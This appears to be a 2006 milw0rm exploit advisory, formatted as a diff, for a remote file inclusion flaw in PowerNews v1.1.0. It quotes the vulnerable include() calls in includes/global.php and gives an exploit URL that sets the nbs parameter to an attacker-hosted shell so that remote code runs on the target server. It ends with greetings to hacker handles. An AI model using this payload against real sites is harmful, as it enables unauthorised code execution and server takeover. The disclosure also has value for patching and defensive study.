@@ -1,0 +1,32 @@
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                         PowerNews v1.1.0 (nbs) Remote File Inclusion
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                          Affected Software .: PowerNews v1.1.0
+                          Download..: http://sourceforge.net/project/showfiles.php?group_id=35550                           
+			  Class .............: Remote File Inclusion                                     
+                          Risk ..............: high                              
+                          Found by ..........: CvIr.System                                                  
+                          Contact ...........: CvIr.System[at]gmail.com                                   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     Affected File:                                                                
+includes/global.php
+
+ Vulnerable Code:
+
+if(@fopen($nbs .'./includes/config.php', 'a'))
+{
+    die("config.php is writeable by your webserver, this is a possible security risk.");
+}    
+
+include($nbs .'./includes/config.php');
+include($nbs .'./includes/auth.php');
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Exploit:
+                                                                      
+    http://[target]/includes/global.php?nbs=[shell]? 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Special GreetingS:_ANtrAX_|Azrael|her0|Matasanos|Ednux|4ur3v0ir|FR34K|Quetzal|Hanowars|xarnuz|Slappter|by_emR3|mnox|Malvinas|Txis|The Shredder|FaLeNcE
+
+# milw0rm.com [2006-09-21]
